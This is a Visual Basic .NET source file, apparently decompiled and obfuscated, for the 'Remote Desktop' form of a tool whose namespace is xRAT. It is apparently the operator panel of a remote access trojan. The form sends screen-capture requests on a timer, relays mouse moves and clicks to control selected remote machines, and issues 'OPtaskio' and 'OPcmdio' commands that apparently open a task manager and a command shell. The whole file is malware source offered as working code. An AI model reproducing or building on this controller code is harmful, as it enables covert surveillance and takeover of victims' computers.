Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class RemoteDesktop
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.RemoteDesktop_Load)
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.RemoteDesktop_FormClosing)
            Me.InitializeComponent
        End Sub

        Private Sub Button3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim box As New TextBox
            Me.OpenFileDialog1.ShowDialog
            box.Text = Me.OpenFileDialog1.FileName
            Me.PictureBox1.Image.Save(box.Text)
        End Sub

        Private Sub daxawBwCf(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub exitbtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Close
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.icontainer_0 = New Container
            Dim manager As New ComponentResourceManager(GetType(RemoteDesktop))
            Me.Timer1 = New Timer(Me.icontainer_0)
            Me.Label1 = New Label
            Me.Label2 = New Label
            Me.NumericUpDown1 = New NumericUpDown
            Me.Label3 = New Label
            Me.ComboBox1 = New ComboBox
            Me.Label4 = New Label
            Me.OpenFileDialog1 = New OpenFileDialog
            Me.RadioButton1 = New RadioButton
            Me.RadioButton2 = New RadioButton
            Me.Button3 = New Button
            Me.stopbtn = New Button
            Me.startbtn = New Button
            Me.exitbtn = New Button
            Me.PictureBox1 = New PictureBox
            Me.NumericUpDown1.BeginInit
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.Timer1.Interval = &H7D0
            Me.Label1.AutoSize = True
            Dim point As New Point(&H102, 9)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            Dim size As New Size(&H4F, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 1
            Me.Label1.Text = "Refresh every "
            Me.Label2.AutoSize = True
            point = New Point(&H182, 9)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(50, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 2
            Me.Label2.Text = "seconds."
            point = New Point(340, 7)
            Me.NumericUpDown1.Location = point
            Dim num As New Decimal(New Integer() { 10, 0, 0, 0 })
            Me.NumericUpDown1.Maximum = num
            num = New Decimal(New Integer() { 1, 0, 0, 0 })
            Me.NumericUpDown1.Minimum = num
            Me.NumericUpDown1.Name = "NumericUpDown1"
            Me.NumericUpDown1.ReadOnly = True
            size = New Size(40, &H15)
            Me.NumericUpDown1.Size = size
            Me.NumericUpDown1.TabIndex = 3
            num = New Decimal(New Integer() { 2, 0, 0, 0 })
            Me.NumericUpDown1.Value = num
            Me.Label3.AutoSize = True
            point = New Point(&H23B, 10)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H36, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 7
            Me.Label3.Text = "Size: 0 KB"
            Me.ComboBox1.FormattingEnabled = True
            Me.ComboBox1.Items.AddRange(New Object() { "5", "10", "30", "70", "100" })
            point = New Point(&H1FC, 7)
            Me.ComboBox1.Location = point
            Me.ComboBox1.Name = "ComboBox1"
            size = New Size(&H30, &H15)
            Me.ComboBox1.Size = size
            Me.ComboBox1.TabIndex = 8
            Me.ComboBox1.Text = "10"
            Me.Label4.AutoSize = True
            point = New Point(&H1C9, 10)
            Me.Label4.Location = point
            Me.Label4.Name = "Label4"
            size = New Size(&H2D, 13)
            Me.Label4.Size = size
            Me.Label4.TabIndex = 9
            Me.Label4.Text = "Quality:"
            Me.OpenFileDialog1.CheckFileExists = False
            Me.OpenFileDialog1.FileName = "Screenshoot"
            Me.RadioButton1.AutoSize = True
            Me.RadioButton1.Checked = True
            point = New Point(&H108, 30)
            Me.RadioButton1.Location = point
            Me.RadioButton1.Name = "RadioButton1"
            size = New Size(&HB3, &H11)
            Me.RadioButton1.Size = size
            Me.RadioButton1.TabIndex = 13
            Me.RadioButton1.TabStop = True
            Me.RadioButton1.Text = "Enable Mouse/Keyboard Control"
            Me.RadioButton1.UseVisualStyleBackColor = True
            Me.RadioButton2.AutoSize = True
            point = New Point(&H1CF, 30)
            Me.RadioButton2.Location = point
            Me.RadioButton2.Name = "RadioButton2"
            size = New Size(&HB5, &H11)
            Me.RadioButton2.Size = size
            Me.RadioButton2.TabIndex = 14
            Me.RadioButton2.Text = "Disable Mouse/Keyboard Control"
            Me.RadioButton2.UseVisualStyleBackColor = True
            Me.Button3.Dock = DockStyle.Bottom
            Me.Button3.Image = Class5.smethod_66
            point = New Point(0, &H1A1)
            Me.Button3.Location = point
            Me.Button3.Name = "Button3"
            size = New Size(&H2A0, &H2F)
            Me.Button3.Size = size
            Me.Button3.TabIndex = 12
            Me.Button3.Text = "Save Picture"
            Me.Button3.TextAlign = ContentAlignment.MiddleRight
            Me.Button3.TextImageRelation = TextImageRelation.ImageBeforeText
            Me.Button3.UseVisualStyleBackColor = True
            Me.stopbtn.Image = Class5.smethod_67
            point = New Point(&H5D, 5)
            Me.stopbtn.Location = point
            Me.stopbtn.Name = "stopbtn"
            size = New Size(&H4B, &H29)
            Me.stopbtn.Size = size
            Me.stopbtn.TabIndex = 6
            Me.stopbtn.Text = "Stop"
            Me.stopbtn.TextAlign = ContentAlignment.MiddleRight
            Me.stopbtn.TextImageRelation = TextImageRelation.ImageBeforeText
            Me.stopbtn.UseVisualStyleBackColor = True
            Me.startbtn.Image = Class5.smethod_83
            point = New Point(12, 5)
            Me.startbtn.Location = point
            Me.startbtn.Name = "startbtn"
            size = New Size(&H4B, &H29)
            Me.startbtn.Size = size
            Me.startbtn.TabIndex = 5
            Me.startbtn.Text = "Start"
            Me.startbtn.TextImageRelation = TextImageRelation.ImageBeforeText
            Me.startbtn.UseVisualStyleBackColor = True
            Me.exitbtn.Image = Class5.smethod_85
            point = New Point(&HAE, 5)
            Me.exitbtn.Location = point
            Me.exitbtn.Name = "exitbtn"
            size = New Size(&H4E, &H29)
            Me.exitbtn.Size = size
            Me.exitbtn.TabIndex = 4
            Me.exitbtn.Text = "Close"
            Me.exitbtn.TextAlign = ContentAlignment.MiddleRight
            Me.exitbtn.TextImageRelation = TextImageRelation.ImageBeforeText
            Me.exitbtn.UseVisualStyleBackColor = True
            Me.PictureBox1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top)))
            Me.PictureBox1.BackColor = Color.White
            Me.PictureBox1.BorderStyle = BorderStyle.FixedSingle
            point = New Point(0, &H34)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H2A0, 370)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 0
            Me.PictureBox1.TabStop = False
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H2A0, &H1D0)
            Me.ClientSize = size
            Me.Controls.Add(Me.RadioButton2)
            Me.Controls.Add(Me.RadioButton1)
            Me.Controls.Add(Me.Label4)
            Me.Controls.Add(Me.Button3)
            Me.Controls.Add(Me.ComboBox1)
            Me.Controls.Add(Me.stopbtn)
            Me.Controls.Add(Me.startbtn)
            Me.Controls.Add(Me.NumericUpDown1)
            Me.Controls.Add(Me.exitbtn)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.PictureBox1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "RemoteDesktop"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Remote Desktop"
            Me.NumericUpDown1.EndInit
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub method_0(ByVal sender As Object, ByVal e As MouseEventArgs)
            If Me.RadioButton1.Checked Then
                Dim str As String = Me.PictureBox1.Size.ToString
                Dim num As Double = (CDbl(e.X) / CDbl(Convert.ToInt32(str.Substring(7, (str.IndexOf(",") - 7)))))
                Dim num2 As Double = (CDbl(e.Y) / CDbl(Convert.ToInt32(str.Substring((str.IndexOf(",") + 9)).Trim(New Char() { "}"c }))))
                If (e.Button = MouseButtons.Left) Then
                    Class2.Class4_0.method_6.SendToSelected(("LClickDown|" & num.ToString & "|" & num2.ToString))
                ElseIf (e.Button = MouseButtons.Right) Then
                    Class2.Class4_0.method_6.SendToSelected(("RClickDown|" & num.ToString & "|" & num2.ToString))
                End If
            End If
        End Sub

        Private Sub method_1(ByVal sender As Object, ByVal e As MouseEventArgs)
            If Me.RadioButton1.Checked Then
                Dim str As String = Me.PictureBox1.Size.ToString
                Dim num As Double = (CDbl(e.X) / CDbl(Convert.ToInt32(str.Substring(7, (str.IndexOf(",") - 7)))))
                Dim num2 As Double = (CDbl(e.Y) / CDbl(Convert.ToInt32(str.Substring((str.IndexOf(",") + 9)).Trim(New Char() { "}"c }))))
                Class2.Class4_0.method_6.SendToSelected(("MoveMouse|" & num.ToString & "|" & num2.ToString))
            End If
        End Sub

        Private Sub method_2(ByVal sender As Object, ByVal e As MouseEventArgs)
            If Me.RadioButton1.Checked Then
                Dim str As String = Me.PictureBox1.Size.ToString
                Dim num As Double = (CDbl(e.X) / CDbl(Convert.ToInt32(str.Substring(7, (str.IndexOf(",") - 7)))))
                Dim num2 As Double = (CDbl(e.Y) / CDbl(Convert.ToInt32(str.Substring((str.IndexOf(",") + 9)).Trim(New Char() { "}"c }))))
                If (e.Button = MouseButtons.Left) Then
                    Class2.Class4_0.method_6.SendToSelected(("LClickUp|" & num.ToString & "|" & num2.ToString))
                ElseIf (e.Button = MouseButtons.Right) Then
                    Class2.Class4_0.method_6.SendToSelected(("RClickUp|" & num.ToString & "|" & num2.ToString))
                End If
            End If
        End Sub

        Private Sub method_3(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_6.SendToSelected("OPtaskio")
        End Sub

        Private Sub method_4(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_6.SendToSelected("OPcmdio")
        End Sub

        Private Sub NumericUpDown1_ValueChanged(ByVal sender As Object, ByVal e As EventArgs)
            Me.Timer1.Interval = Convert.ToInt32(Decimal.Multiply(Me.NumericUpDown1.Value, 1000))
        End Sub

        Private Sub RemoteDesktop_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Me.Timer1.Enabled = False
            Me.startbtn.Enabled = True
            Me.stopbtn.Enabled = False
        End Sub

        Private Sub RemoteDesktop_Load(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim point As New Point(&H29C, &H1FA)
                Me.MinimumSize = DirectCast(point, Size)
                Me.Timer1.Enabled = True
                Me.startbtn.Enabled = False
                Me.stopbtn.Enabled = True
                Me.PictureBox1.Image = Nothing
                Class2.Class4_0.method_6.SendToSelected(("REMOTEDESK|" & Me.ComboBox1.Text))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                MessageBox.Show("The Quality or the number of picture by time is too hight", "Remote Desktop", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub startbtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.Timer1.Enabled = True
                Me.startbtn.Enabled = False
                Me.stopbtn.Enabled = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                MessageBox.Show("The Quality or the number of picture by time is too hight", "Remote Desktop", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub stopbtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Timer1.Enabled = False
            Me.startbtn.Enabled = True
            Me.stopbtn.Enabled = False
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_6.SendToSelected(("REMOTEDESK|" & Me.ComboBox1.Text))
        End Sub


        ' Properties
        Friend Overridable Property Button3 As Button
            Get
                Return Me._Button3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button3_Click)
                If (Not Me._Button3 Is Nothing) Then
                    RemoveHandler Me._Button3.Click, handler
                End If
                Me._Button3 = value
                If (Not Me._Button3 Is Nothing) Then
                    AddHandler Me._Button3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ComboBox1 As ComboBox
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ComboBox)
                Me._ComboBox1 = value
            End Set
        End Property

        Friend Overridable Property exitbtn As Button
            Get
                Return Me._exitbtn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.exitbtn_Click)
                If (Not Me._exitbtn Is Nothing) Then
                    RemoveHandler Me._exitbtn.Click, handler
                End If
                Me._exitbtn = value
                If (Not Me._exitbtn Is Nothing) Then
                    AddHandler Me._exitbtn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label3 = value
            End Set
        End Property

        Friend Overridable Property Label4 As Label
            Get
                Return Me._Label4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label4 = value
            End Set
        End Property

        Friend Overridable Property NumericUpDown1 As NumericUpDown
            Get
                Return Me._NumericUpDown1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As NumericUpDown)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.NumericUpDown1_ValueChanged)
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    RemoveHandler Me._NumericUpDown1.ValueChanged, handler
                End If
                Me._NumericUpDown1 = value
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    AddHandler Me._NumericUpDown1.ValueChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property OpenFileDialog1 As OpenFileDialog
            Get
                Return Me.openFileDialog_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As OpenFileDialog)
                Me.openFileDialog_0 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Dim handler As MouseEventHandler = New MouseEventHandler(AddressOf Me.method_1)
                Dim handler2 As MouseEventHandler = New MouseEventHandler(AddressOf Me.method_0)
                Dim handler3 As MouseEventHandler = New MouseEventHandler(AddressOf Me.method_2)
                If (Not Me._PictureBox1 Is Nothing) Then
                    RemoveHandler Me._PictureBox1.MouseMove, handler
                    RemoveHandler Me._PictureBox1.MouseDown, handler2
                    RemoveHandler Me._PictureBox1.MouseUp, handler3
                End If
                Me._PictureBox1 = value
                If (Not Me._PictureBox1 Is Nothing) Then
                    AddHandler Me._PictureBox1.MouseMove, handler
                    AddHandler Me._PictureBox1.MouseDown, handler2
                    AddHandler Me._PictureBox1.MouseUp, handler3
                End If
            End Set
        End Property

        Friend Overridable Property RadioButton1 As RadioButton
            Get
                Return Me._RadioButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Me._RadioButton1 = value
            End Set
        End Property

        Friend Overridable Property RadioButton2 As RadioButton
            Get
                Return Me._RadioButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RadioButton)
                Me._RadioButton2 = value
            End Set
        End Property

        Friend Overridable Property startbtn As Button
            Get
                Return Me._startbtn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.startbtn_Click)
                If (Not Me._startbtn Is Nothing) Then
                    RemoveHandler Me._startbtn.Click, handler
                End If
                Me._startbtn = value
                If (Not Me._startbtn Is Nothing) Then
                    AddHandler Me._startbtn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property stopbtn As Button
            Get
                Return Me._stopbtn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.stopbtn_Click)
                If (Not Me._stopbtn Is Nothing) Then
                    RemoveHandler Me._stopbtn.Click, handler
                End If
                Me._stopbtn = value
                If (Not Me._stopbtn Is Nothing) Then
                    AddHandler Me._stopbtn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            Get
                Return Me.timer_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me.timer_0 Is Nothing) Then
                    RemoveHandler Me.timer_0.Tick, handler
                End If
                Me.timer_0 = value
                If (Not Me.timer_0 Is Nothing) Then
                    AddHandler Me.timer_0.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button3")> _
        Private _Button3 As Button
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As ComboBox
        <AccessedThroughProperty("exitbtn")> _
        Private _exitbtn As Button
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("Label4")> _
        Private _Label4 As Label
        <AccessedThroughProperty("NumericUpDown1")> _
        Private _NumericUpDown1 As NumericUpDown
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("RadioButton1")> _
        Private _RadioButton1 As RadioButton
        <AccessedThroughProperty("RadioButton2")> _
        Private _RadioButton2 As RadioButton
        <AccessedThroughProperty("startbtn")> _
        Private _startbtn As Button
        <AccessedThroughProperty("stopbtn")> _
        Private _stopbtn As Button
        Private icontainer_0 As IContainer
        <AccessedThroughProperty("OpenFileDialog1")> _
        Private openFileDialog_0 As OpenFileDialog
        <AccessedThroughProperty("Timer1")> _
        Private timer_0 As Timer
    End Class
End Namespace

